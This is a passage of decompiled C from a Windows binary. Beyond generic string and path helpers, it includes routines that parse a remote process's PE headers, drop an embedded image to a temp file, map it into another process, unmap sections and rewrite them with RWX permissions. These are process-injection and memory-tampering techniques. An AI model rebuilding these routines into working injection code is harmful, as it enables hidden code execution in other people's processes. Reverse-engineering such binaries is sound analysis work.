            (ushort)(SUB161(auVar12 >> 0x47,0) & 1) << 8 |
            (ushort)(SUB161(auVar12 >> 0x4f,0) & 1) << 9 |
            (ushort)(SUB161(auVar12 >> 0x57,0) & 1) << 10 |
            (ushort)(SUB161(auVar12 >> 0x5f,0) & 1) << 0xb |
            (ushort)(SUB161(auVar12 >> 0x67,0) & 1) << 0xc |
            (ushort)(SUB161(auVar12 >> 0x6f,0) & 1) << 0xd |
            (ushort)((byte)(auVar12._14_2_ >> 7) & 1) << 0xe | auVar12._14_2_ & 0x8000;
    if (uVar2 != 0xffff) {
      uVar5 = ~(uint)uVar2;
      uVar8 = 0;
      if (uVar5 != 0) {
        for (; (uVar5 >> uVar8 & 1) == 0; uVar8 = uVar8 + 1) {
        }
      }
      uVar10 = 1;
      if (*(ushort *)(*param_1 + ((uVar8 >> 1) + uVar4) * 2) <
          *(ushort *)(*param_2 + ((uVar8 >> 1) + uVar4) * 2)) {
        uVar10 = 0xffffffff;
      }
      return uVar10;
    }
    uVar4 = uVar4 + 8;
    pauVar9 = (undefined1 (*) [32])(*pauVar9 + 0x10);
    pauVar11 = (undefined1 (*) [32])(*pauVar11 + 0x10);
    uVar1 = uVar1 + 8;
  }
  if (uVar4 + 4 <= param_3) {
    if (*(ulonglong *)*pauVar9 != *(ulonglong *)*pauVar11) {
      uVar6 = *(ulonglong *)*pauVar11 ^ *(ulonglong *)*pauVar9;
      uVar1 = 0;
      if (uVar6 != 0) {
        for (; (uVar6 >> uVar1 & 1) == 0; uVar1 = uVar1 + 1) {
        }
      }
      uVar10 = 1;
      if (*(ushort *)(*param_1 + ((uVar1 >> 4) + uVar4) * 2) <
          *(ushort *)(*param_2 + ((uVar1 >> 4) + uVar4) * 2)) {
        uVar10 = 0xffffffff;
      }
      return uVar10;
    }
    uVar4 = uVar4 + 4;
  }
  if (uVar4 < param_3) {
    puVar7 = (ushort *)(*param_1 + uVar4 * 2);
    do {
      uVar2 = *(ushort *)(((longlong)param_2 - (longlong)param_1) + (longlong)puVar7);
      if (*puVar7 != uVar2) {
        if (*puVar7 < uVar2) {
          return 0xffffffff;
        }
        return 1;
      }
      uVar4 = uVar4 + 1;
      puVar7 = puVar7 + 1;
    } while (uVar4 < param_3);
  }
  return 0;
}



/* ==================================================================== */
/* FUN_140037720 @ 140037720 */

uint * FUN_140037720(uint *param_1,uint *param_2)

{
  uint uVar1;
  short sVar2;
  longlong lVar3;

  lVar3 = (longlong)param_2 - (longlong)param_1 >> 1;
  if (lVar3 < 2) {
    return param_1;
  }
  uVar1 = *param_1;
  sVar2 = (short)(uVar1 >> 0x10);
  if ((uVar1 & 0xffffffdf) - 0x3a0041 < 0x1a) {
    return param_1 + 1;
  }
  if (((short)uVar1 != 0x5c) && ((short)uVar1 != 0x2f)) {
    return param_1;
  }
  if ((3 < lVar3) &&
     ((*(short *)((longlong)param_1 + 6) == 0x5c || (*(short *)((longlong)param_1 + 6) == 0x2f)))) {
    if ((lVar3 != 4) && (((short)param_1[2] == 0x5c || ((short)param_1[2] == 0x2f))))
    goto LAB_1400377df;
    sVar2 = *(short *)((longlong)param_1 + 2);
    if ((((sVar2 == 0x5c) || (sVar2 == 0x2f)) &&
        (((short)param_1[1] == 0x3f || ((short)param_1[1] == 0x2e)))) ||
       ((sVar2 == 0x3f && ((short)param_1[1] == 0x3f)))) {
      return (uint *)((longlong)param_1 + 6);
    }
  }
  if (lVar3 < 3) {
    return param_1;
  }
LAB_1400377df:
  if ((((sVar2 != 0x5c) && (sVar2 != 0x2f)) || ((short)param_1[1] == 0x5c)) ||
     ((short)param_1[1] == 0x2f)) {
    return param_1;
  }
  param_1 = (uint *)((longlong)param_1 + 6);
  if (param_1 == param_2) {
    return param_1;
  }
  while( true ) {
    if ((short)*param_1 == 0x5c) {
      return param_1;
    }
    if ((short)*param_1 == 0x2f) break;
    param_1 = (uint *)((longlong)param_1 + 2);
    if (param_1 == param_2) {
      return param_1;
    }
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140037830 @ 140037830 */

uint * FUN_140037830(uint *param_1,uint *param_2)

{
  short *psVar1;
  uint *puVar2;
  longlong lVar3;
  code *pcVar4;
  int iVar5;
  short *psVar6;
  uint *_Src;
  ulonglong uVar7;
  uint *puVar8;
  uint *puVar9;
  longlong lVar10;
  ulonglong uVar11;
  ulonglong uVar12;

  uVar11 = *(ulonglong *)(param_2 + 6);
  puVar9 = param_2;
  if (7 < uVar11) {
    puVar9 = *(uint **)param_2;
  }
  lVar3 = *(longlong *)(param_2 + 4);
  lVar10 = lVar3 * 2 >> 1;
  if ((lVar10 < 2) || (0x19 < (*puVar9 & 0xffffffdf) - 0x3a0041)) {
    puVar8 = (uint *)FUN_140037720(puVar9,(short *)(lVar3 * 2 + (longlong)puVar9));
    if (puVar9 != puVar8) goto LAB_14003796f;
  }
  else if ((2 < lVar10) && (((short)puVar9[1] == 0x5c || ((short)puVar9[1] == 0x2f)))) {
LAB_14003796f:
    if (param_1 == param_2) {
      return param_1;
    }
    if (7 < uVar11) {
      param_2 = *(uint **)param_2;
    }
    FUN_140038ac0(param_1,param_2,lVar3);
    return param_1;
  }
  puVar9 = param_1;
  if (7 < *(ulonglong *)(param_1 + 6)) {
    puVar9 = *(uint **)param_1;
  }
  psVar1 = (short *)((longlong)puVar9 + *(longlong *)(param_1 + 4) * 2);
  puVar8 = param_2;
  if (7 < uVar11) {
    puVar8 = *(uint **)param_2;
  }
  puVar2 = (uint *)((longlong)puVar8 + lVar3 * 2);
  psVar6 = (short *)FUN_140037720(puVar9,psVar1);
  _Src = (uint *)FUN_140037720(puVar8,puVar2);
  if (puVar8 != _Src) {
    uVar12 = (longlong)_Src - (longlong)puVar8 >> 1;
    uVar7 = (longlong)psVar6 - (longlong)puVar9 >> 1;
    uVar11 = uVar7;
    if (uVar12 < uVar7) {
      uVar11 = uVar12;
    }
    iVar5 = FUN_140037570(puVar9,puVar8,uVar11);
    if (((iVar5 != 0) || (uVar7 < uVar12)) || (uVar12 < uVar7)) {
      if (param_1 == param_2) {
        return param_1;
      }
      puVar9 = param_2 + 4;
      if (7 < *(ulonglong *)(param_2 + 6)) {
        param_2 = *(uint **)param_2;
      }
      FUN_140038ac0(param_1,param_2,*(undefined8 *)puVar9);
      return param_1;
    }
  }
  if ((_Src == puVar2) || (((short)*_Src != 0x5c && ((short)*_Src != 0x2f)))) {
    if (psVar6 == psVar1) {
      if ((longlong)((longlong)psVar6 - (longlong)puVar9 & 0xfffffffffffffffeU) < 6)
      goto LAB_140037a36;
    }
    else if ((psVar1[-1] == 0x5c) || (psVar1[-1] == 0x2f)) goto LAB_140037a36;
    uVar11 = *(ulonglong *)(param_1 + 4);
    if (uVar11 < *(ulonglong *)(param_1 + 6)) {
      *(ulonglong *)(param_1 + 4) = uVar11 + 1;
      puVar9 = param_1;
      if (7 < *(ulonglong *)(param_1 + 6)) {
        puVar9 = *(uint **)param_1;
      }
      psVar1 = (short *)((longlong)puVar9 + uVar11 * 2);
      psVar1[0] = 0x5c;
      psVar1[1] = 0;
    }
    else {
      FUN_140038c10(param_1);
    }
  }
  else {
    uVar11 = (longlong)psVar6 - (longlong)puVar9 >> 1;
    if (*(ulonglong *)(param_1 + 4) < uVar11) {
      FUN_140025d70();
      pcVar4 = (code *)swi(3);
      puVar9 = (uint *)(*pcVar4)();
      return puVar9;
    }
    *(ulonglong *)(param_1 + 4) = uVar11;
    puVar9 = param_1;
    if (7 < *(ulonglong *)(param_1 + 6)) {
      puVar9 = *(uint **)param_1;
    }
    *(short *)((longlong)puVar9 + uVar11 * 2) = 0;
  }
LAB_140037a36:
  lVar3 = *(longlong *)(param_1 + 4);
  uVar11 = (longlong)puVar2 - (longlong)_Src >> 1;
  if (*(ulonglong *)(param_1 + 6) - lVar3 < uVar11) {
    FUN_140038d70(param_1,uVar11);
  }
  else {
    *(ulonglong *)(param_1 + 4) = lVar3 + uVar11;
    puVar9 = param_1;
    if (7 < *(ulonglong *)(param_1 + 6)) {
      puVar9 = *(uint **)param_1;
    }
    memmove((short *)((longlong)puVar9 + lVar3 * 2),_Src,uVar11 * 2);
    *(short *)((longlong)puVar9 + (lVar3 + uVar11) * 2) = 0;
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140037ac0 @ 140037ac0 */

undefined8 * FUN_140037ac0(undefined8 *param_1,uint *param_2,uint *param_3)

{
  short sVar1;
  longlong lVar2;
  longlong lVar3;
  undefined8 *puVar4;
  undefined2 *_Dst;
  ulonglong uVar5;
  longlong lVar6;
  uint *_Src;

  lVar2 = *(longlong *)(param_3 + 4);
  _Src = param_3;
  if (7 < *(ulonglong *)(param_3 + 6)) {
    _Src = *(uint **)param_3;
  }
  if (((lVar2 == 0) ||
      (((3 < lVar2 * 2 && ((*_Src & 0xffffffdf) - 0x3a0041 < 0x1a)) || ((short)*_Src == 0x5c)))) ||
     ((short)*_Src == 0x2f)) {
    FUN_14000f320();
    FUN_140037830(param_1,param_3);
    return param_1;
  }
  lVar3 = *(longlong *)(param_2 + 4);
  if (7 < *(ulonglong *)(param_2 + 6)) {
    param_2 = *(uint **)param_2;
  }
  if (lVar3 == 2) {
    if (0x19 < (*param_2 & 0xffffffdf) - 0x3a0041) {
LAB_140037ba6:
      sVar1 = *(short *)((longlong)param_2 + lVar3 * 2 + -2);
      if ((sVar1 != 0x5c) && (sVar1 != 0x2f)) {
        lVar6 = 1;
        goto LAB_140037b68;
      }
    }
  }
  else if (lVar3 != 0) goto LAB_140037ba6;
  lVar6 = 0;
LAB_140037b68:
  uVar5 = lVar6 + lVar3 + lVar2;
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 7;
  *(undefined2 *)param_1 = 0;
  if (uVar5 < 8) {
    param_1[2] = uVar5;
  }
  else {
    FUN_140039180(0,uVar5);
  }
  puVar4 = param_1;
  if (7 < (ulonglong)param_1[3]) {
    puVar4 = (undefined8 *)*param_1;
  }
  memcpy(puVar4,param_2,lVar3 * 2);
  _Dst = (undefined2 *)(lVar3 * 2 + (longlong)puVar4);
  if ((char)lVar6 != '\0') {
    *_Dst = 0x5c;
    _Dst = _Dst + 1;
  }
  memcpy(_Dst,_Src,lVar2 * 2);
  param_1[2] = uVar5;
  puVar4 = param_1;
  if (7 < (ulonglong)param_1[3]) {
    puVar4 = (undefined8 *)*param_1;
  }
  *(undefined2 *)((longlong)puVar4 + uVar5 * 2) = 0;
  return param_1;
}



/* ==================================================================== */
/* FUN_140037c50 @ 140037c50 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

ulonglong *
FUN_140037c50(undefined8 *param_1,ulonglong *param_2,LPCVOID param_3,undefined8 *param_4)

{
  longlong lVar1;
  BOOL BVar2;
  int iVar3;
  longlong lVar4;
  undefined8 *_Buf1;
  size_t sVar6;
  size_t sVar5;
  ushort uVar7;
  undefined1 auStackY_248 [32];
  undefined8 local_218;
  undefined1 local_210;
  ulonglong local_200;
  ulonglong uStack_1f8;
  undefined8 local_1f0;
  undefined8 uStack_1e8;
  ulonglong local_1e0;
  ulonglong local_1d8;
  undefined8 local_1c8;
  undefined8 uStack_1c0;
  undefined8 local_1b8;
  undefined8 uStack_1b0;
  undefined8 local_1a8;
  undefined8 uStack_1a0;
  undefined8 local_198;
  undefined8 uStack_190;
  ulonglong *local_188;
  undefined8 local_180;
  ulonglong uStack_178;
  undefined8 local_170;
  undefined8 uStack_168;
  undefined8 local_160;
  int local_158;
  ushort local_152;
  ushort local_144;
  ulonglong local_48;

  local_48 = DAT_14005d040 ^ (ulonglong)auStackY_248;
  local_1c8 = 0;
  uStack_1c0 = 0;
  local_1b8 = 0;
  uStack_1b0 = 0;
  local_1a8 = 0;
  uStack_1a0 = 0;
  local_198 = 0;
  uStack_190 = 0;
  local_188 = param_2;
  memset(&local_158,0,0x108);
  local_188 = (ulonglong *)0x0;
  BVar2 = ReadProcessMemory((HANDLE)*param_1,param_3,&local_1c8,0x40,(SIZE_T *)&local_188);
  if ((BVar2 != 0) && ((short)local_1c8 == 0x5a4d)) {
    BVar2 = ReadProcessMemory((HANDLE)*param_1,
                              (LPCVOID)((longlong)uStack_190._4_4_ + (longlong)param_3),&local_158,
                              0x108,(SIZE_T *)&local_188);
    if ((BVar2 != 0) && (local_158 == 0x4550)) {
      uVar7 = 0;
      lVar4 = (longlong)uStack_190._4_4_;
      if (local_152 != 0) {
        do {
          local_160 = 0;
          local_180 = 0;
          uStack_178 = 0;
          local_170 = 0;
          uStack_168 = 0;
          BVar2 = ReadProcessMemory((HANDLE)*param_1,
                                    (LPCVOID)((longlong)param_3 +
                                             (ulonglong)uVar7 * 0x28 +
                                             lVar4 + 0x18 + (ulonglong)local_144),&local_180,0x28,
                                    (SIZE_T *)&local_188);
          if (BVar2 == 0) break;
          local_218 = local_180;
          local_210 = 0;
          sVar6 = 0xffffffffffffffff;
          do {
            sVar5 = sVar6 + 1;
            lVar1 = sVar6 + 1;
            sVar6 = sVar5;
          } while (*(char *)((longlong)&local_218 + lVar1) != '\0');
          sVar6 = param_4[2];
          _Buf1 = param_4;
          if (0xf < (ulonglong)param_4[3]) {
            _Buf1 = (undefined8 *)*param_4;
          }
          if ((sVar6 == sVar5) &&
             ((sVar6 == 0 || (iVar3 = memcmp(_Buf1,&local_218,sVar6), iVar3 == 0)))) {
            local_200 = 0;
            uStack_1f8 = 0;
            local_1f0 = 0;
            uStack_1e8 = 0;
            FUN_140024ce0(&local_200,&local_218,sVar5);
            local_1d8 = uStack_178 & 0xffffffff;
            *param_2 = local_200;
            param_2[1] = uStack_1f8;
            local_1e0 = (uStack_178 >> 0x20) + (longlong)param_3;
            *(undefined4 *)(param_2 + 2) = (undefined4)local_1f0;
            *(undefined4 *)((longlong)param_2 + 0x14) = local_1f0._4_4_;
            *(undefined4 *)(param_2 + 3) = (undefined4)uStack_1e8;
            *(undefined4 *)((longlong)param_2 + 0x1c) = uStack_1e8._4_4_;
            param_2[5] = local_1d8;
            param_2[4] = local_1e0;
            local_1f0 = 0;
            uStack_1e8 = 0xf;
            local_200 = local_200 & 0xffffffffffffff00;
            *(undefined1 *)(param_2 + 6) = 1;
            FUN_140025000(&local_200);
            return param_2;
          }
          uVar7 = uVar7 + 1;
        } while (uVar7 < local_152);
      }
    }
  }
  *(undefined1 *)(param_2 + 6) = 0;
  return param_2;
}



/* ==================================================================== */
/* FUN_140037e90 @ 140037e90 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

HANDLE FUN_140037e90(undefined8 *param_1,HANDLE param_2,undefined8 param_3)

{
  char *pcVar1;
  bool bVar2;
  DWORD DVar3;
  undefined4 uVar4;
  int iVar5;
  ulonglong uVar6;
  void *_Dst;
  HANDLE hObject;
  ulonglong uVar7;
  LPCWSTR *****ppppppWVar8;
  ulonglong uVar9;
  longlong lVar10;
  longlong lVar11;
  undefined1 auStackY_3e8 [32];
  void *local_398;
  undefined8 uStack_390;
  ulonglong local_388;
  ulonglong local_380;
  CHAR *local_378;
  longlong local_370;
  undefined1 local_360 [32];
  LPVOID local_340;
  HANDLE local_338;
  int iStack_32c;
  longlong local_328;
  undefined1 local_320 [8];
  basic_ostream<char,std::char_traits<char>_> local_318 [152];
  basic_ios<char,std::char_traits<char>_> local_280 [104];
  ulonglong local_218;
  void *local_210;
  longlong lStack_208;
  longlong local_200;
  LPCWSTR *****local_1f8 [3];
  ulonglong local_1e0;
  short local_1d8 [64];
  CHAR local_158;
  char acStack_157 [271];
  ulonglong local_48;

  local_48 = DAT_14005d040 ^ (ulonglong)auStackY_3e8;
  local_338 = param_2;
  GetTempPathA(0x104,&local_158);
  LOCK();
  DAT_140a618c4 = DAT_140a618c4 + 1;
  UNLOCK();
  DVar3 = GetTickCount();
  FUN_140038a50(local_1d8,L"MEM%08X_%04X.IMG",DVar3);
  lVar10 = -1;
  uVar9 = 0xffffffffffffffff;
  do {
    uVar9 = uVar9 + 1;
  } while (local_1d8[uVar9] != 0);
  local_398 = (void *)0x0;
  uStack_390 = 0;
  local_388 = 0;
  local_380 = 0;
  if (0x7ffffffffffffffe < uVar9) {
                    /* WARNING: Subroutine does not return */
    FUN_14000eb00();
  }
  if (uVar9 < 8) {
    local_380 = 7;
    local_388 = uVar9;
    memcpy(&local_398,local_1d8,uVar9 * 2);
    *(undefined2 *)(local_360 + (uVar9 * 2 - 0x38)) = 0;
  }
  else {
    uVar6 = uVar9 | 7;
    if (uVar6 < 0x7fffffffffffffff) {
      if (uVar6 < 10) {
        uVar6 = 10;
      }
      uVar7 = uVar6 + 1;
      if (0x7fffffffffffffff < uVar7) {
                    /* WARNING: Subroutine does not return */
        FUN_140009c90();
      }
    }
    else {
      uVar7 = 0x7fffffffffffffff;
      uVar6 = 0x7ffffffffffffffe;
    }
    _Dst = (void *)FUN_14000e6b0(uVar7 * 2);
    local_398 = _Dst;
    local_388 = uVar9;
    local_380 = uVar6;
    memcpy(_Dst,local_1d8,uVar9 * 2);
    *(undefined2 *)((longlong)_Dst + uVar9 * 2) = 0;
  }
  do {
    lVar11 = lVar10 + 1;
    pcVar1 = acStack_157 + lVar10;
    lVar10 = lVar11;
  } while (*pcVar1 != '\0');
  uVar4 = FUN_140050fe4();
  local_378 = &local_158;
  local_370 = lVar11;
  FUN_14000f1b0(local_360,uVar4,&local_378);
  FUN_140037ac0(local_1f8,local_360,&local_398);
  FUN_140023190(local_360);
  FUN_140023190(&local_398);
  memset(&local_328,0,0x108);
  ppppppWVar8 = (LPCWSTR *****)local_1f8;
  if (7 < local_1e0) {
    ppppppWVar8 = local_1f8[0];
  }
  FUN_140038f70(&local_328,ppppppWVar8);
  *(undefined ***)(local_320 + (longlong)*(int *)(local_328 + 4) + -8) = &PTR_LAB_1400571a0;
  *(int *)(local_320 + (longlong)*(int *)(local_328 + 4) + -0xc) = *(int *)(local_328 + 4) + -0xa8;
  bVar2 = std::ios_base::operator!((ios_base *)(local_320 + (longlong)*(int *)(local_328 + 4) + -8))
  ;
  if (bVar2) {
    FUN_140023590(param_2,param_3);
    *(undefined8 *)((longlong)param_2 + 0x20) = 0;
    *(undefined8 *)((longlong)param_2 + 0x28) = 0;
    *(undefined ***)(local_320 + (longlong)*(int *)(local_328 + 4) + -8) = &PTR_LAB_1400571a0;
    *(int *)(local_320 + (longlong)*(int *)(local_328 + 4) + -0xc) = *(int *)(local_328 + 4) + -0xa8
    ;
    FUN_1400243b0(local_320);
    std::basic_ostream<char,std::char_traits<char>_>::~basic_ostream<char,std::char_traits<char>_>
              (local_318);
    std::basic_ios<char,std::char_traits<char>_>::~basic_ios<char,std::char_traits<char>_>
              (local_280);
  }
  else {
    std::basic_ostream<char,std::char_traits<char>_>::write
              ((basic_ostream<char,std::char_traits<char>_> *)&local_328,&DAT_140a4e4c0,0x12818);
    *(undefined ***)(local_320 + (longlong)*(int *)(local_328 + 4) + -8) = &PTR_LAB_1400571a0;
    *(int *)(local_320 + (longlong)*(int *)(local_328 + 4) + -0xc) = *(int *)(local_328 + 4) + -0xa8
    ;
    FUN_1400243b0(local_320);
    std::basic_ostream<char,std::char_traits<char>_>::~basic_ostream<char,std::char_traits<char>_>
              (local_318);
    std::basic_ios<char,std::char_traits<char>_>::~basic_ios<char,std::char_traits<char>_>
              (local_280);
    ppppppWVar8 = (LPCWSTR *****)local_1f8;
    if (7 < local_1e0) {
      ppppppWVar8 = local_1f8[0];
    }
    hObject = CreateFileW((LPCWSTR)ppppppWVar8,0x21,5,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0)
    ;
    if (hObject != (HANDLE)0xffffffffffffffff) {
      local_338 = (HANDLE)0x0;
      iVar5 = NtCreateSection(&local_338,0xf,0,0);
      CloseHandle(hObject);
      if (-1 < iVar5) {
        local_340 = (LPVOID)0x0;
        local_218 = 0;
        iVar5 = NtMapViewOfSection(local_338,*param_1,&local_340,0);
        CloseHandle(local_338);
        uVar9 = local_218;
        if ((iVar5 == 0) && (local_340 != (LPVOID)0x0)) {
          local_210 = (void *)0x0;
          lStack_208 = 0;
          local_200 = 0;
          if (local_218 != 0) {
            if (0x7fffffffffffffff < local_218) {
                    /* WARNING: Subroutine does not return */
              FUN_14000e380();
            }
            local_210 = (void *)FUN_14000e6b0(local_218);
            lVar10 = (longlong)local_210 + uVar9;
            local_200 = lVar10;
            memset(local_210,0,uVar9);
            lStack_208 = lVar10;
          }
          VirtualProtectEx((HANDLE)*param_1,local_340,local_218,0x80,(PDWORD)&DAT_140a619d8);
          WriteProcessMemory((HANDLE)*param_1,local_340,local_210,lStack_208 - (longlong)local_210,
                             (SIZE_T *)0x0);
          VirtualProtectEx((HANDLE)*param_1,local_340,local_218,0x40,(PDWORD)&DAT_140a619dc);
          FUN_140023590(param_2,param_3);
          *(LPVOID *)((longlong)param_2 + 0x20) = local_340;
          *(ulonglong *)((longlong)param_2 + 0x28) = local_218;
          FUN_14000e3a0(&local_210);
          goto LAB_140038384;
        }
      }
    }
    FUN_140023590(param_2,param_3);
    *(undefined8 *)((longlong)param_2 + 0x20) = 0;
    *(undefined8 *)((longlong)param_2 + 0x28) = 0;
  }
LAB_140038384:
  FUN_140023190(local_1f8);
  return param_2;
}



/* ==================================================================== */
/* FUN_1400383d0 @ 1400383d0 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_1400383d0(undefined8 *param_1,LPCVOID param_2)

{
  SIZE_T SVar1;
  undefined1 auStack_68 [32];
  _MEMORY_BASIC_INFORMATION local_48;
  ulonglong local_18;

  local_18 = DAT_14005d040 ^ (ulonglong)auStack_68;
  local_48.BaseAddress = (PVOID)0x0;
  local_48.AllocationBase = (PVOID)0x0;
  local_48.AllocationProtect = 0;
  local_48._20_4_ = 0;
  local_48.RegionSize = 0;
  local_48.State = 0;
  local_48.Protect = 0;
  local_48._40_8_ = 0;
  SVar1 = VirtualQueryEx((HANDLE)*param_1,param_2,&local_48,0x30);
  if ((SVar1 != 0) && (((ulonglong)local_48.Type & 0x1000000) != 0)) {
    NtUnmapViewOfSection(*param_1,param_2);
  }
  return;
}



/* ==================================================================== */
/* FUN_140038450 @ 140038450 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined8 FUN_140038450(undefined8 *param_1,undefined8 param_2,undefined8 param_3)

{
  longlong lVar1;
  ulonglong _Size;
  int iVar2;
  LPVOID pvVar3;
  undefined8 uVar4;
  undefined1 auStackY_a8 [32];
  LPVOID local_78;
  longlong lStack_70;
  longlong local_68;
  undefined1 local_60 [32];
  LPCVOID local_40;
  ulonglong local_38;
  char local_30;
  ulonglong local_28;

  local_28 = DAT_14005d040 ^ (ulonglong)auStackY_a8;
  FUN_140037c50(param_1,local_60,param_2,param_3);
  _Size = local_38;
  if (local_30 == '\0') {
    uVar4 = 0;
  }
  else {
    local_78 = (LPVOID)0x0;
    lStack_70 = 0;
    local_68 = 0;
    if (local_38 != 0) {
      if (0x7fffffffffffffff < local_38) {
                    /* WARNING: Subroutine does not return */
        FUN_14000e380();
      }
      local_78 = (LPVOID)FUN_14000e6b0(local_38);
      lVar1 = (longlong)local_78 + _Size;
      local_68 = lVar1;
      memset(local_78,0,_Size);
      lStack_70 = lVar1;
    }
    ReadProcessMemory((HANDLE)*param_1,local_40,local_78,lStack_70 - (longlong)local_78,
                      (SIZE_T *)0x0);
    iVar2 = NtUnmapViewOfSection(*param_1,local_40);
    if ((iVar2 < 0) ||
       (pvVar3 = VirtualAllocEx((HANDLE)*param_1,local_40,local_38,0x3000,0x40),
       pvVar3 == (LPVOID)0x0)) {
      uVar4 = 0;
    }
    else {
      WriteProcessMemory((HANDLE)*param_1,local_40,local_78,lStack_70 - (longlong)local_78,
                         (SIZE_T *)0x0);
      VirtualProtectEx((HANDLE)*param_1,local_40,local_38,0x20,(PDWORD)&DAT_140a619e0);
      uVar4 = 1;
    }
    FUN_14000e3a0(&local_78);
  }
  if (local_30 != '\0') {
    FUN_140025000(local_60);
  }
  return uVar4;
}



/* ==================================================================== */
/* FUN_1400385e0 @ 1400385e0 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined8 FUN_1400385e0(undefined8 *param_1,LPCVOID param_2,longlong *param_3)

{
  BOOL BVar1;
  SIZE_T SVar2;
  undefined4 extraout_var;
  undefined4 extraout_var_00;
  undefined8 uVar3;
  undefined1 auStackY_88 [32];
  DWORD local_58 [2];
  _MEMORY_BASIC_INFORMATION local_50;
  ulonglong local_20;

  local_20 = DAT_14005d040 ^ (ulonglong)auStackY_88;
  local_50.BaseAddress = (PVOID)0x0;
  local_50.AllocationBase = (PVOID)0x0;
  local_50.AllocationProtect = 0;
  local_50._20_4_ = 0;
  local_50.RegionSize = 0;
  local_50.State = 0;
  local_50.Protect = 0;
  local_50.Type = 0;
  local_50._44_4_ = 0;
  SVar2 = VirtualQueryEx((HANDLE)*param_1,param_2,&local_50,0x30);
  uVar3 = 0;
  if (SVar2 != 0) {
    if (local_50.Protect != 0x40) {
      VirtualProtectEx((HANDLE)*param_1,param_2,param_3[1] - *param_3,0x40,local_58);
    }
    BVar1 = WriteProcessMemory((HANDLE)*param_1,param_2,(LPCVOID)*param_3,param_3[1] - *param_3,
                               (SIZE_T *)0x0);
    uVar3 = CONCAT44(extraout_var,BVar1);
    if (local_50.Protect != 0x40) {
      BVar1 = VirtualProtectEx((HANDLE)*param_1,param_2,param_3[1] - *param_3,local_58[0],local_58);
      uVar3 = CONCAT44(extraout_var_00,BVar1);
    }
    uVar3 = CONCAT71((int7)((ulonglong)uVar3 >> 8),1);
  }
  return uVar3;
}



/* ==================================================================== */
/* FUN_1400386d0 @ 1400386d0 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_1400386d0(undefined8 *param_1,LPCVOID param_2,undefined8 *param_3)

{
  void *pvVar1;
  ushort uVar2;
  longlong lVar3;
  BOOL BVar4;
  int iVar5;
  size_t sVar7;
  size_t sVar6;
  undefined8 *_Buf1;
  uint uVar8;
  longlong lVar9;
  undefined1 auStackY_338 [32];
  undefined8 local_308;
  undefined8 uStack_300;
  undefined8 local_2f8;
  ulonglong uStack_2f0;
  ulonglong local_2e8;
  undefined8 local_2d8;
  undefined8 uStack_2d0;
  undefined8 local_2c8;
  undefined8 uStack_2c0;
  undefined8 local_2b8;
  undefined8 uStack_2b0;
  undefined8 local_2a8;
  undefined8 uStack_2a0;
  void *local_298;
  void *pvStack_290;
  void *local_288;
  void *local_280;
  void *pvStack_278;
  void *local_270;
  void *local_268;
  void *pvStack_260;
  void *local_258;
  int local_248 [34];
  uint local_1c0;
  int local_1bc;
  char local_138 [256];
  ulonglong local_38;

  local_38 = DAT_14005d040 ^ (ulonglong)auStackY_338;
  if ((param_2 != (LPCVOID)0x0) && (param_3[2] != 0)) {
    local_2d8 = 0;
    uStack_2d0 = 0;
    local_2c8 = 0;
    uStack_2c0 = 0;
    local_2b8 = 0;
    uStack_2b0 = 0;
    local_2a8 = 0;
    uStack_2a0 = 0;
    lVar9 = 0;
    BVar4 = ReadProcessMemory((HANDLE)*param_1,param_2,&local_2d8,0x40,(SIZE_T *)0x0);
    if ((BVar4 != 0) && ((short)local_2d8 == 0x5a4d)) {
      memset(local_248,0,0x108);
      BVar4 = ReadProcessMemory((HANDLE)*param_1,
                                (LPCVOID)((longlong)uStack_2a0._4_4_ + (longlong)param_2),local_248,
                                0x108,(SIZE_T *)0x0);
      if ((((BVar4 != 0) && (local_248[0] == 0x4550)) && (local_1c0 != 0)) && (local_1bc != 0)) {
        local_308 = 0;
        uStack_300 = 0;
        local_2f8 = 0;
        uStack_2f0 = 0;
        local_2e8 = 0;
        BVar4 = ReadProcessMemory((HANDLE)*param_1,
                                  (LPCVOID)((longlong)param_2 + (ulonglong)local_1c0),&local_308,
                                  0x28,(SIZE_T *)0x0);
        if (BVar4 != 0) {
          local_280 = (void *)0x0;
          pvStack_278 = (void *)0x0;
          local_270 = (void *)0x0;
          uVar8 = 0;
          if ((uint)uStack_2f0 != 0) {
            sVar7 = (uStack_2f0 & 0xffffffff) * 4;
            local_280 = (void *)FUN_14000e6b0(sVar7);
            pvVar1 = (void *)(sVar7 + (longlong)local_280);
            local_270 = pvVar1;
            memset(local_280,0,sVar7);
            uVar8 = (uint)uStack_2f0;
            pvStack_278 = pvVar1;
          }
          local_298 = (void *)0x0;
          pvStack_290 = (void *)0x0;
          local_288 = (void *)0x0;
          if (uVar8 != 0) {
            sVar7 = (ulonglong)uVar8 * 2;
            local_298 = (void *)FUN_14000e6b0(sVar7);
            pvVar1 = (void *)(sVar7 + (longlong)local_298);
            local_288 = pvVar1;
            memset(local_298,0,sVar7);
            pvStack_290 = pvVar1;
          }
          local_268 = (void *)0x0;
          pvStack_260 = (void *)0x0;
          local_258 = (void *)0x0;
          if (local_2f8 >> 0x20 != 0) {
            sVar7 = (local_2f8 >> 0x20) * 4;
            local_268 = (void *)FUN_14000e6b0(sVar7);
            pvVar1 = (void *)((longlong)local_268 + sVar7);
            local_258 = pvVar1;
            memset(local_268,0,sVar7);
            pvStack_260 = pvVar1;
          }
          BVar4 = ReadProcessMemory((HANDLE)*param_1,
                                    (LPCVOID)((local_2e8 & 0xffffffff) + (longlong)param_2),
                                    local_280,
                                    (longlong)pvStack_278 - (longlong)local_280 & 0xfffffffffffffffc
                                    ,(SIZE_T *)0x0);
          if (((BVar4 != 0) &&
              (BVar4 = ReadProcessMemory((HANDLE)*param_1,
                                         (LPCVOID)((local_2e8 >> 0x20) + (longlong)param_2),
                                         local_298,
                                         ((longlong)pvStack_290 - (longlong)local_298 >> 1) * 2,
                                         (SIZE_T *)0x0), BVar4 != 0)) &&
             (BVar4 = ReadProcessMemory((HANDLE)*param_1,
